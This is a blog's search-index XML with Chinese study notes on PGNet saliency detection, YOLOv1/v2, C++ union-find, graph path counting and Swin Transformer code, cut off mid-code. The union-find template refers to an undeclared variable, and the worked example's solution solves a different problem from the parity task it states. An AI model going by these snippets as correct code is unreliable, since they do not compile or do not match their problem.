<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pyramid Grafting Network for One-Stage High Resolution Saliency Detection</title>
      <link href="/2023/04/18/PGNet/"/>
      <url>/2023/04/18/PGNet/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>由于采样深度和感受野大小之间的矛盾，大多数根据低分辨输入设计的SOD模型在高分辨率图像中表现不佳，本文提出一种金字塔嫁接网络。使用transformer和CNN主干分别从不同分辨率的图像中提取特征，然后将特征从transformer分支嫁接到CNN分支，与此同时提出一种基于注意的分叉模型嫁接模块，使CNN分支能够在解码过程中，在不同信源特征的引导下，更全面地组合破碎的细节信息，此外还设计了一个注意引导丢失来明确监督交叉嫁接模块生成注意矩阵，以帮助网络更好地与来自不同模型的注意进行交互。</p><h3 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h3><p>当前主流的SOD模型遇到高分辨率的图像，为了减少内存的开销往往会将图像先下采样然后对输出结果上采样已恢复原始分辨率，由于现在的SOD模型都是使用编码器-解码器的方式设计的，随着分辨率的大幅度提高，提取的特征大小会增加，但是网络的感受野是固定的，使得相对感受野变小，最终导致无法捕获对任务至关重要的全局语义。</p><div align="center"><img src="/2023/04/18/PGNet/高分辨率下的传统模型困境.PNG"></div> <p>目前对于高分辨率SOD方法有两种主流：HRSOD和DHQSOD，其中HRSOD将整个过程分为全局阶段，局部阶段和重组阶段，全局阶段为局部阶段和作物过程提供指导。DHSOD将SOD任务分解为分类任务和回归任务，这两个任务通过他们提出的trimap和不确定性损失连接起来，它们生成具有清晰边界的相对较好的显著性贴图。但是这两者都是使用多阶段架构，将SOD分为语义(低分辨率)和细节(高分辨率)两个阶段。由此引出两个问题：</p><blockquote><ul><li>阶段间语境语义迁移不一致，在前一个阶段获得的中间映射被输入到最后一个阶段，同时错误也被传递，由此后续细化阶段可能将继续放大错误</li><li>耗时，与单阶段相比，多阶段方法不仅难以并行且参数过多，模型运行运行速度较慢</li></ul></blockquote><h3 id="高分辨率SDO发展"><a href="#高分辨率SDO发展" class="headerlink" title="高分辨率SDO发展"></a>高分辨率SDO发展</h3><p>Zeng等人<a href="https://ieeexplore.ieee.org/document/9008818">Towards High-Resolution Salient Object Detection</a>提出了一种高分辨率显著目标检测范式，使用GSN提取语义信息，使用APS引导的LRN优化局部细节，最后使用GLFN进行预测融合。他们还提供了第一个高分辨率显著目标检测数据集（HRSOD）。Tang等人<a href="https://ieeexplore.ieee.org/document/9709916">Disentangled high quality salient object detection</a>提出，显著目标检测应分为两项任务。他们首先设计LRSCN以在低分辨率下捕获足够的语义并生成trimap。通过引入不确定性损失，所设计的HRRN可以对第一阶段使用低分辨率数据集生成的trimap进行细化。然而，它们都使用多级体系结构，这导致推理速度较慢，难以满足某些实际应用场景。更严重的问题是网络之间的语义不一致。</p><p>使用常用的SOD数据集通常分辨率较低，用他们来训练高分辨率网络和评估高质量分割存在以下几点缺点:</p><blockquote><ul><li>图像分辨率低导致细节不足</li><li>注释边缘的质量较差</li><li>注释的更加精细级别不够令人满意</li></ul></blockquote><p>当前可用的高分辨率数据集是HRSOD，但是HRSOD数据集图像数量有限,严重影响模型的泛化能力。</p><h3 id="Staggered-Grafting-Framework"><a href="#Staggered-Grafting-Framework" class="headerlink" title="Staggered Grafting Framework"></a>Staggered Grafting Framework</h3><p>网络框架如图所示：</p><div align="center"><img src="/2023/04/18/PGNet/Pyramid_Grafting_network.PNG"></div> <p>由两个编码器和一个解码器构成，使用Swim transformer和ResNet18作为编码器，transformer编码器能够在低分辨率情况下获得准确的全局语义信息，卷积编码器能够在高分辨率输入下获得丰富的细节信息，不同模型之间的提取的特征可能是互补的，可以获得更多的有效特征。</p><p>在编码的过程中，向两个编码器馈送不同分辨率的图像，并行获取全局语义信息和详细信息。解码分为三个过程，一个是Swim解码，一个是嫁接编码，最后是交错结构的ResNet解码，在第二个子阶段的解码特征是从跨模态移植模块产生的，其中全局语义信息从Swin分支移植到ResNet分支，跨模态移植模块还会处理一个名为CAM的矩阵进行监督</p><h3 id="交叉模型迁移模块-CMGM"><a href="#交叉模型迁移模块-CMGM" class="headerlink" title="交叉模型迁移模块(CMGM)"></a>交叉模型迁移模块(CMGM)</h3><p>作用：移植由两个编码器提取的特征，对于transformer所提取的特征$f_{S_2}$能够远距离捕获信息，具有全局语义信息。使用ResNet所得到的$f_{R_5}$有更好的局部信息，也就是更丰富的细节信息。但是由于特征大小和感受野之间的差异，在$f_{R_5}$中有更多的噪声。</p><p>使用常见的融合方法：如逐元素相加和相乘的适用情况限制在显著预测和不同特征生成的预测至少有一部分是对的情况下，否则就是一种错误的适用方式，且这种操作都只关注于有限的局部信息，导致没法实现自我纠错。</p><p>作者提出使用CMGM重新计算ResNet特征和Transformer特征之间的逐点关系，将全局语义信息通过transformer分支转移到ResNet分支，从而弥补常见的错误，通过计算$E&#x3D;|G-P| \in [0,1]$得到误差图</p><h3 id="CMGM纠错效果图"><a href="#CMGM纠错效果图" class="headerlink" title=" CMGM纠错效果图"></a><center> CMGM纠错效果图</center></h3><div align="center"><img src="/2023/04/18/PGNet/CMGM纠错.PNG"></div> <h3 id="CMGM网络结构"><a href="#CMGM网络结构" class="headerlink" title=" CMGM网络结构"></a><center> CMGM网络结构</center></h3><div align="center"><img src="/2023/04/18/PGNet/CMGM网络结构.PNG"></div><h3 id="实验结果"><a href="#实验结果" class="headerlink" title=" 实验结果"></a><center> 实验结果</center></h3><div align="center"><img src="/2023/04/18/PGNet/PGNet定量实验结果.PNG"></div><h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a><center>可视化</center></h3><div align="center"><img src="/2023/04/18/PGNet/PGNet可视化结果.PNG"></div><p>关于MSELoss、BCELoss、CELoss损失函数求导的推导<br><a href="https://blog.csdn.net/zzl12880/article/details/128403845">损失函数</a></p>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> High-Resolution Vision </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yolov1</title>
      <link href="/2023/04/16/YoLov1/"/>
      <url>/2023/04/16/YoLov1/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>目前物体检测算法有以下三种：</p><blockquote><ul><li>1.传统物体检测算法，使用人工设计特征以及机器学习的分类方式，但这种算法提取到的特征局限性较大且学习速度有限；</li><li>2.结合候选框+深度学习分类法，这类Two-Stage方法解决了前者的问题，在精度上有很大突破，但在速度上很难达到实时检测的效果；</li><li>3.基于深度学习的回归方法，在速度上达到了实时级别的突破，本文使用YOLO就是属于One-stage，YOLO虽然在v1,v2版本准确率上有所欠缺，但到v5版本时准确率提高了很多。</li></ul></blockquote><h3 id="Yolo简介"><a href="#Yolo简介" class="headerlink" title="Yolo简介"></a>Yolo简介</h3><blockquote><p>① YOLO的全称是you only look once，指只需要浏览一次就可以识别出图中的物体的类别和位置。<br>② YOLO是目标检测模型。目标检测是计算机视觉中比较简单的任务，用来在一张图篇中找到某些特定的物体，目标检测不仅要求我们识别这些物体的种类，同时要求我们标出这些物体的位置。<br>③ YOLO能实现图像或视频中物体的快速识别，在相同的识别类别范围和识别准确率条件下，YOLO识别速度最快。YOLO有多种模型</p></blockquote><img src="/2023/04/16/YoLov1/yolo.PNG"><h3 id="yolov1"><a href="#yolov1" class="headerlink" title="yolov1"></a>yolov1</h3><p>算法流程：</p><blockquote><ul><li>1.将输入图像缩放到$448\times448\times3$大小</li><li>2.经过卷积网络backbone提取特征图</li><li>3.把提取到的特征图输入到两层全连接层，最终输出$7\times7\times30$大小的特征图</li></ul></blockquote><p>检测方法：</p><blockquote><ul><li>1.将输入图像划分成S*S的网格，如果物体中心落入某个网格内，就由该网格单元负责检测该目标。</li><li>2.每个网格预测B个边界框和它们的置信度，置信度是预测框和真实物体IOU和网格是否包含物体01值之积</li><li>3.每个边界框都包含5个预测值，x,y,w,h,confidence，分别代表中心坐标，宽高和IOU值，这里的坐标是相对于网格左上角的偏移量，宽高是相对于整幅图像的占比</li></ul></blockquote><img src="/2023/04/16/YoLov1/yolov1.PNG"><h4 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h4><p>网络前面的卷积层用于从图像中提取特征，全连接层用于预测输出概率和坐标，共有24个卷积层，2个全连接层。</p><img src="/2023/04/16/YoLov1/yolov1archit.PNG"><h4 id="Training设计"><a href="#Training设计" class="headerlink" title="Training设计"></a>Training设计</h4><p>使用ImageNet分类数据先做预训练，预训练使用的网络为Fig 3中的前20层卷积，再加一个average-pooling层和全连接层。预训练好以后，再加4层卷积和2层全连接(随机初始化权重)去训练检测任务，输入大小为448×448,预训练分类时使用的是224×224。最后一层会同时输出类别概率和box的坐标，利用图像的宽和高对box的宽和高做归一化，使其介于0和1之间。将box的x和y坐标参数化为特定网格单元位置的偏移量，因此它们也在0和1之间。对最后一层使用线性激活函数，其他层均使用leaky ReLU。</p><p>优化模型输出的sum-squared error，是因为它很容易优化，但并不完全符合最大化average precision的目标。它将定位误差与分类误差同等加权，这可能并不理想。此外，图像中会有很多网格不包含任何目标，这些网格的confidence score为0，这通常会overpower确实包含目标的网格的梯度。这会导致模型不稳定，出现发散。为了解决这个问题，增加了bounding box坐标预测的损失，减小了不包含目标的box的confidence预测的损失，使用参数 $\lambda_{coord}(&#x3D;5),\lambda_{noobj}(&#x3D;0.5)$来完成</p><p>sum-squared error对大box和小box也是同等加权的，一个好的误差度量应该能反映出small box中的小偏差比large box的小偏差更重要。为了解决这个问题，使用bounding box的宽和高的平方根来计算，而不是宽和高本身。YOLO对每个网格单元会预测多个bounding boxes。在训练时，我们希望对每个目标只有一个bounding box预测器对其负责。会分配一个预测器来负责预测一个目标，基于它的预测与ground truth有最高的IOU。</p><h4 id="YOLOV1优点"><a href="#YOLOV1优点" class="headerlink" title="YOLOV1优点"></a>YOLOV1优点</h4><blockquote><p>①快。因为回归问题没有复杂的流程（pipeline）。<br>②可以基于整幅图像预测（看全貌而不是只看部分）。与基于滑动窗口和区域提议的技术不同，YOLO在训练和测试期间会看到整个图像，因此它隐式地编码有关类及其外观的上下文信息。因为能看到图像全貌，与 Fast R-CNN 相比，YOLO 预测背景出错的次数少了一半。<br>③学习到物体的通用表示（generalizable representations），泛化能力好。因此，当训练集和测试集类型不同时，YOLO 的表现比 DPM 和 R-CNN 好得多，应用于新领域也很少出现崩溃的情况。</p></blockquote><h4 id="YOLOV1缺点"><a href="#YOLOV1缺点" class="headerlink" title="YOLOV1缺点"></a>YOLOV1缺点</h4><blockquote><p>① 空间限制：一个单元格只能预测两个框和一个类别，这种空间约束必然会限制预测的数量；<br>② 难扩展：模型根据数据预测边界框，很难将其推广到具有新的或不同寻常的宽高比或配置的对象。由于输出层为全连接层，因此在检测时，YOLO 训练模型只支持与训练图像相同的输入分辨率。<br>③ 网络损失不具体：无论边界框的大小都用损失函数近似为检测性能，物体 IOU 误差和小物体 IOU 误差对网络训练中 loss 贡献值接近，但对于大边界框来说，小损失影响不大，对于小边界框，小错误对 IOU 影响较大，从而降低了物体检测的定位准确性。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> Yolo </tag>
            
            <tag> Detection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yolov2</title>
      <link href="/2023/04/16/Yolov2/"/>
      <url>/2023/04/16/Yolov2/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>由于YOLOv1存在定位不准确以及与two-stage方法相比召回率低的缺点，作者于2017年提出了YOLOv2算法。在论文中作者提出了从更准确，更快，更多识别三个角度对YOLOv1算法进行了改进，其中识别更多对象也就是扩展到能检测9000种不同对象，被称为YOLO9000。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> Yolo </tag>
            
            <tag> Detection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并查集</title>
      <link href="/2023/04/16/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
      <url>/2023/04/16/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>并查集是一种树型的数据结构，用于处理一些不相交集合的合并及查询问题（即所谓的并、查）。比如说，我们可以用并查集来判断一个森林中有几棵树、某个节点是否属于某棵树等。并查集（Union-Find）就是用来对集合进行 合并（Union） 与 查询（Find） 操作的一种数据结构。</p><blockquote><p>合并 就是将两个不相交的集合合并成一个集合。<br>查询 就是查询两个元素是否属于同一集合。</p></blockquote><p>简易版并查集模板</p><pre><code class="cpp">int n=1001;//定义节点数量int father[1001]//初始化并查集int init()&#123;    for(int i=0;i&lt;n;i++)&#123;        father[i]=i;    &#125;&#125;//并查集查找根int find(int x)&#123;    return u==father[u]?u:father[u]=find(father[u]);//压缩路径&#125;//将v-&gt;u这条边添加到并查集中int merge(int u,int v)&#123;    u=find(u);    v=find(v);    if(u==v) return;    father[v]=u;&#125;//在减少find函数迭代次数的情况，优化加边的操作就会变成将小集合连接到大集合上int merge_2(int u,int v)&#123;    u=find(u);    v=find(v);    if(u==v) return ;    if(size[u]&lt;size[v]) father[u]=v;    else father[v]=u; &#125;//判断u和v是否是在一个根下int same(int u,int v)&#123;    u=find(u);    v=find(v);    return u==v;&#125;</code></pre><h3 id="带权并查集"><a href="#带权并查集" class="headerlink" title="带权并查集"></a>带权并查集</h3><p>在一般的并查集的基础上，在每条边中记录额外的信息</p><pre><code class="cpp">int n=1001;//定义节点数量int father[1001];int value[1001];//初始化并查集int init()&#123;    for(int i=0;i&lt;n;i++)&#123;        father[i]=i;    &#125;&#125;//并查集查找根int find(int x)&#123;    if(x!=father[x])&#123;        int t=father[x];        father[x]=find(father[x]);        value[x]+=value[t];    &#125;    return father[x];&#125;</code></pre><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>题目描述：</p><blockquote><p>Now and then you play the following game with your friend. Your friend writes down a sequence consisting of zeroes and ones. You choose a continuous subsequence (for example the subsequence from the third to the fifth digit inclusively) and ask him, whether this subsequence contains even or odd number of ones. Your friend answers your question and you can ask him about another subsequence and so on. Your task is to guess the entire sequence of numbers.<br>You suspect some of your friend’s answers may not be correct and you want to convict him of falsehood. Thus you have decided to write a program to help you in this matter. The program will receive a series of your questions together with the answers you have received from your friend. The aim of this program is to find the first answer which is provably wrong, i.e. that there exists a sequence satisfying answers to all the previous questions, but no such sequence satisfies this answer.</p></blockquote><p>输入：</p><blockquote><p>The first line of input contains one number, which is the length of the sequence of zeroes and ones. This length is less or equal to 1000000000. In the second line, there is one positive integer which is the number of questions asked and answers to them. The number of questions and answers is less or equal to 5000. The remaining lines specify questions and answers. Each line contains one question and the answer to this question: two integers (the position of the first and last digit in the chosen subsequence) and one word which is either <code>even&#39; or </code>odd’ (the answer, i.e. the parity of the number of ones in the chosen subsequence, where <code>even&#39; means an even number of ones and </code>odd’ means an odd number).</p></blockquote><p>输出：</p><blockquote><p>There is only one line in output containing one integer X. Number X says that there exists a sequence of zeroes and ones satisfying first X parity conditions, but there exists none satisfying X+1 conditions. If there exists a sequence of zeroes and ones satisfying all the given conditions, then number X should be the number of all the questions asked.</p></blockquote><blockquote><p>样例：<br>10<br>5<br>1 2 even<br>3 4 odd<br>5 6 even<br>1 6 even<br>7 10 odd</p></blockquote><p>Sample Output</p><blockquote><p>3</p></blockquote><pre><code class="cpp">#include&lt;bits/stdc++.h&gt;using namespace std;const int N=5e4+10;int p[N],d[N];int n,k;int find(int x)&#123;    if(x!=p[x])&#123;        int t=p[x];        p[x]=find(p[x]);        d[x]=d[x]+d[t];    &#125;    return p[x];&#125;signed main()&#123;    cin&gt;&gt;n&gt;&gt;k;    int ans=0;    for(int i=1;i&lt;=n;i++) p[i]=i;    while(k--)    &#123;        int v,a,b;        cin&gt;&gt;v&gt;&gt;a&gt;&gt;b;        if(a&gt;n||b&gt;n) &#123;            ans++;            continue;        &#125;        int pa=find(a),pb=find(b);        if(v==1)&#123;            if(pa==pb)&#123;//在同一个集合内                if((d[a]-d[b])%3)&#123;//如果不是同类关系                    ans++;                &#125;            &#125;            else &#123;//不在一个集合内，要合并                p[pa]=pb;                d[pa]=d[b]-d[a];//更新信息，可以画图理解                                //因为要满足d[b]=d[pa]+d[a]            &#125;        &#125;        else&#123;            if(a==b) &#123;ans++; continue;&#125;            else             &#123;                if(pa==pb)&#123;                    if((d[a] - d[b] - 1) % 3) ans++;                &#125;                else &#123;                    p[pa]=pb;//要满足d[b]=d[pa]+d[a]-1;                    d[pa]=d[b]-d[a]+1;                &#125;            &#125;        &#125;    &#125;    cout&lt;&lt;ans&lt;&lt;endl;    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ACM </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图的有趣性质(一)</title>
      <link href="/2023/04/16/%E5%9B%BE1/"/>
      <url>/2023/04/16/%E5%9B%BE1/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小朋友 A 在和 ta 的小伙伴们玩传信息游戏，游戏规则如下：</p><blockquote><p>1.有 n 名玩家，所有玩家编号分别为 0 ～ n-1，其中小朋友 A 的编号为 0<br>2.每个玩家都有固定的若干个可传信息的其他玩家（也可能没有）。传信息的关系是单向的（比如 A 可以向 B 传信息，但 B 不能向 A 传信息）。<br>每轮信息必须需要传递给另一个人，且信息可重复经过同一个人</p></blockquote><p>给定总玩家数 n，以及按[玩家编号,对应可传递玩家编号]关系组成的二维数组 relation。返回信息从小 A (编号 0 ) 经过 k 轮传递到编号为 n-1 的小伙伴处的方案数；若不能到达，返回 0</p><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><blockquote><p>输入：n &#x3D; 5, relation &#x3D; [[0,2],[2,1],[3,4],[2,3],[1,4],[2,0],[0,4]], k &#x3D; 3<br>输出：3<br>解释：信息从小 A 编号 0 处开始，经 3 轮传递，到达编号 4。共有 3 种方案，分别是 0-&gt;2-&gt;0-&gt;4， 0-&gt;2-&gt;1-&gt;4， 0-&gt;2-&gt;3-&gt;4。</p></blockquote><h3 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h3><p>一眼DFS或者BFS即可</p><pre><code class="cpp">class Solution &#123;public:    int ans=0;    void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; relation, int start, int step, int k, int n) &#123;        if(step==k)&#123;            if(start==n-1)&#123;                ans++;            &#125;            return ;        &#125;        for(int i = 0; i &lt; relation.size(); i++)&#123;            if(relation[i][0] == start)                dfs(relation, relation[i][1], step+1, k, n);        &#125;    &#125;    int numWays(int n, vector&lt;vector&lt;int&gt;&gt;&amp; relation, int k) &#123;        for(int i=0;i&lt;relation.size();i++)&#123;            if(relation[i][0]==0)                 dfs(relation, relation[i][1], 1, k, n);        &#125;        return ans;    &#125;&#125;;</code></pre><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>在图中有一种有趣的性质，当我们使用01的邻接矩阵表示图中边集的连通性时，使用领接矩阵乘以邻接矩阵得到的新矩阵中的[i][j]表示的就是从i-&gt;j的路线数量</p><pre><code class="cpp">class Solution &#123;public:    int N;    vector&lt;vector&lt;int&gt;&gt;A, A0;    void func() &#123;        vector&lt;vector&lt;int&gt;&gt;vt(N, vector&lt;int&gt;(N,0));        for(int i=0;i&lt;N;++i)&#123;            for(int j=0;j&lt;N;++j)&#123;                for(int k=0;k&lt;N;k++)&#123;                    vt[i][j]+=A[i][k]*A0[k][j];                &#125;            &#125;        &#125;        A = vt;    &#125;    int numWays(int n, vector&lt;vector&lt;int&gt;&gt;&amp; relation, int k) &#123;        N = n;        A0.resize(n,vector&lt;int&gt;(n,0));        for(auto&amp; vt : relation )&#123;            A0[vt[0]][vt[1]] = 1;        &#125;        A= A0;        for(int i=1;i&lt;k;++i)&#123;            func();        &#125;        return A[0][n-1];    &#125;&#125;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ACM </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>swin transformer详解</title>
      <link href="/2023/04/14/swin/"/>
      <url>/2023/04/14/swin/</url>
      
        <content type="html"><![CDATA[<h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><img src="/2023/04/14/swin/swin.PNG">从上图中可以知道，swin有两个主要的特点<blockquote><ul><li>1:层级结构，类似于fpn，抽取不同层次的视觉特征，使其更适合分割检测任务，相比起VIT而言，swin有一个分辨率逐渐降低的过程，也就是图像中的4,8,16倍数的下采样，但是VIT则是一支保持16倍的下采样。</li><li>2:transformer范围不同，上图两边红框代表在红框内进行transformer,右边VIT的红框是整张图，而左边Swin Transformer的红框是在小窗口上进行的，也就是swin这个词的意思，在小窗口进行transformer,而非整张图。</li></ul></blockquote><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><img src="/2023/04/14/swin/swin_transformer.PNG">流程<blockquote><ul><li>1.首先将图像输入到patch Partition模块中进行分块，也就是将相邻的$4\times4$的像素作为一个patch，然后再channel方向展开，假设输入的是RGB三通道，那么每个patch就有$4\times4&#x3D;16$个像素，然后每个像素值有R,G,B三个值所以展开后有48个值，所以通过Patch Partition后图像shape由[H,W,3]变成了[H&#x2F;4,W&#x2F;4,48]。然后在通过Linear Embeding层对每个像素的channel数据做线性变换，由48变成C，即图像shape再由[H&#x2F;4,W&#x2F;4,48]变成了[H&#x2F;4,W&#x2F;4,C]</li></ul></blockquote><blockquote><ul><li>2.然后通过四个stage构建不同大小的特征图，除了stage1中通过一个Linear Embeding层外，剩下三个stage都是先通过一个Patch Merging层进行下采样。然后都是重复堆叠Swin Transformer Block注意这里的Block其实有两种结构，如图(b)中所示，这两种结构的不同之处仅在于一个使用了W-MSA结构，一个使用了SW-MSA结构。而且这两个结构是成对使用的，先使用一个W-MSA结构再使用一个SW-MSA结构。所以你会发现堆叠Swin Transformer Block的次数都是偶数</li></ul></blockquote><h3 id="Patch-Embedding"><a href="#Patch-Embedding" class="headerlink" title="Patch Embedding"></a>Patch Embedding</h3><p>在输入进Block前，我们需要将图片切成一个个patch，然后嵌入向量。<br>具体做法是对原始图片裁成一个个 patch_size * patch_size的窗口大小，然后进行嵌入。这里可以通过二维卷积层，将stride，kernelsize设置为patch_size大小。设定输出通道来确定嵌入向量的大小。最后将H,W维度展开，并移动到第一维度</p><pre><code class="python">class PatchEmbed(nn.Module):    r&quot;&quot;&quot; Image to Patch Embedding    Args:        img_size (int): Image size.  Default: 224.        patch_size (int): Patch token size. Default: 4.        in_chans (int): Number of input image channels. Default: 3.        embed_dim (int): Number of linear projection output channels. Default: 96.        norm_layer (nn.Module, optional): Normalization layer. Default: None    &quot;&quot;&quot;    def __init__(self, img_size=224, patch_size=4, in_chans=3, embed_dim=96, norm_layer=None):        super().__init__()        img_size = to_2tuple(img_size)        patch_size = to_2tuple(patch_size)        patches_resolution = [img_size[0] // patch_size[0], img_size[1] // patch_size[1]]        self.img_size = img_size        self.patch_size = patch_size        self.patches_resolution = patches_resolution        self.num_patches = patches_resolution[0] * patches_resolution[1]        self.in_chans = in_chans        self.embed_dim = embed_dim        self.proj = nn.Conv2d(in_chans, embed_dim, kernel_size=patch_size, stride=patch_size)        if norm_layer is not None:            self.norm = norm_layer(embed_dim)        else:            self.norm = None    def forward(self, x):        B, C, H, W = x.shape        # FIXME look at relaxing size constraints        assert H == self.img_size[0] and W == self.img_size[1], \            f&quot;Input image size (&#123;H&#125;*&#123;W&#125;) doesn&#39;t match model (&#123;self.img_size[0]&#125;*&#123;self.img_size[1]&#125;).&quot;        x = self.proj(x).flatten(2).transpose(1, 2)  # B Ph*Pw C        if self.norm is not None:            x = self.norm(x)        return x    def flops(self):        Ho, Wo = self.patches_resolution        flops = Ho * Wo * self.embed_dim * self.in_chans * (self.patch_size[0] * self.patch_size[1])        if self.norm is not None:            flops += Ho * Wo * self.embed_dim        return flops</code></pre><h3 id="Patch-Merging详解"><a href="#Patch-Merging详解" class="headerlink" title="Patch Merging详解"></a>Patch Merging详解</h3><img src="/2023/04/14/swin/Patch-Merging.jpg"><img src="/2023/04/14/swin/1.png">如上图所示，假设输入Patch Merging的是一个4x4大小的单通道特征图（feature map），Patch Merging会将每个2x2的相邻像素划分为一个patch，然后将每个patch中相同位置（同一颜色）像素给拼在一起就得到了4个feature map。接着将这四个feature map在深度方向进行concat拼接，然后在通过一个LayerNorm层。最后通过一个全连接层在feature map的深度方向做线性变化，将feature map的深度由C变成C/2。通过这个简单的例子可以看出，通过Patch Merging层后，feature map的高和宽会减半，深度会翻倍。<pre><code class="python">class PatchMerging(nn.Module):    r&quot;&quot;&quot; Patch Merging Layer.    Args:        input_resolution (tuple[int]): Resolution of input feature.        dim (int): Number of input channels.        norm_layer (nn.Module, optional): Normalization layer.  Default: nn.LayerNorm        该块包含了一个减少通道数的操作和一个归一化操作，输入分辨率为 input_resolution，特征维度为 dim。        在forward方法中，输入的特征张量 x 会被分成四个部分，每个部分都是原始张量的一部分，并且这四个部分会被拼接在一起。        然后，这个拼接后的张量会被归一化和减少通道数，最后返回结果张量。extra_repr方法用于返回该模块的一些额外信息，        flops 方法用于计算该模块的计算量。    &quot;&quot;&quot;    def __init__(self, input_resolution, dim, norm_layer=nn.LayerNorm):        super().__init__()        self.input_resolution = input_resolution        self.dim = dim        self.reduction = nn.Linear(4 * dim, 2 * dim, bias=False)        self.norm = norm_layer(4 * dim)    def forward(self, x):        &quot;&quot;&quot;        x: B, H*W, C        输入参数x是一个形状为[B, HW, C]的张量，其中B表示batch size，H和W表示输入图像的高和宽，C表示输入通道数。        该函数首先将输入x的形状改变为[B, H, W, C]，然后将输入的每个像素点分成四个小块（2x2），分别对每个小块进行操作，        并将结果在通道维度上拼接起来，得到一个形状为[B, H/2W/2, 4*C]的张量。接着，对这个张量进行归一化和降维操作，        最后返回结果。在函数执行过程中，还进行了一些检查，        例如检查输入特征的尺寸是否正确，以及输入图像的高和宽是否为偶数。        &quot;&quot;&quot;        H, W = self.input_resolution        B, L, C = x.shape        assert L == H * W, &quot;input feature has wrong size&quot;        assert H % 2 == 0 and W % 2 == 0, f&quot;x size (&#123;H&#125;*&#123;W&#125;) are not even.&quot;        x = x.view(B, H, W, C)        x0 = x[:, 0::2, 0::2, :]  # B H/2 W/2 C        x1 = x[:, 1::2, 0::2, :]  # B H/2 W/2 C        x2 = x[:, 0::2, 1::2, :]  # B H/2 W/2 C        x3 = x[:, 1::2, 1::2, :]  # B H/2 W/2 C        x = torch.cat([x0, x1, x2, x3], -1)  # B H/2 W/2 4*C        x = x.view(B, -1, 4 * C)  # B H/2*W/2 4*C        x = self.norm(x)        x = self.reduction(x)        return x    def extra_repr(self) -&gt; str:        return f&quot;input_resolution=&#123;self.input_resolution&#125;, dim=&#123;self.dim&#125;&quot;    def flops(self):        H, W = self.input_resolution        flops = H * W * self.dim        flops += (H // 2) * (W // 2) * 4 * self.dim * 2 * self.dim        return flops</code></pre><p>ps：LayerNorm层是一种归一化技术，主要作用是对神经网络中的每个样本进行归一化，使得每个样本的特征都具有相同的分布。具体来说，LayerNorm层会对每个样本的特征进行均值和方差的计算，并将其归一化为标准正态分布，从而使得每个样本的特征都具有相同的尺度和分布，从而提高神经网络的训练效果和泛化能力。此外，LayerNorm层还可以减轻梯度消失和梯度爆炸问题，提高神经网络的稳定性。</p><h3 id="window-Attention"><a href="#window-Attention" class="headerlink" title="window Attention"></a>window Attention</h3><p>计算方式：<br>$$\Large Attention(Q,K,V)&#x3D;Softmax(\frac{QK^T}{\sqrt{d} }+B)V$$<br>为了实现多头Self-Attention,和传统的全局Self-Attention所不同，swin中引入了相对位置编码。</p><pre><code class="python">class WindowAttention(nn.Module):    r&quot;&quot;&quot; Window based multi-head self attention (W-MSA) module with relative position bias.    It supports both of shifted and non-shifted window.    Args:        dim (int): Number of input channels.        window_size (tuple[int]): The height and width of the window.        num_heads (int): Number of attention heads.        qkv_bias (bool, optional):  If True, add a learnable bias to query, key, value. Default: True        qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set        attn_drop (float, optional): Dropout ratio of attention weight. Default: 0.0        proj_drop (float, optional): Dropout ratio of output. Default: 0.0    &quot;&quot;&quot;    def __init__(self, dim, window_size, num_heads, qkv_bias=True, qk_scale=None, attn_drop=0., proj_drop=0.):        super().__init__()        self.dim = dim        self.window_size = window_size  # Wh, Ww        self.num_heads = num_heads # nH        head_dim = dim // num_heads # 每个注意力头对应的通道数        self.scale = qk_scale or head_dim ** -0.5        # define a parameter table of relative position bias        self.relative_position_bias_table = nn.Parameter(            torch.zeros((2 * window_size[0] - 1) * (2 * window_size[1] - 1), num_heads))  # 设置一个形状为（2*(Wh-1) * 2*(Ww-1), nH）的可学习变量，用于后续的位置编码        # get pair-wise relative position index for each token inside the window        coords_h = torch.arange(self.window_size[0])        coords_w = torch.arange(self.window_size[1])        coords = torch.stack(torch.meshgrid([coords_h, coords_w]))  # 2, Wh, Ww        coords_flatten = 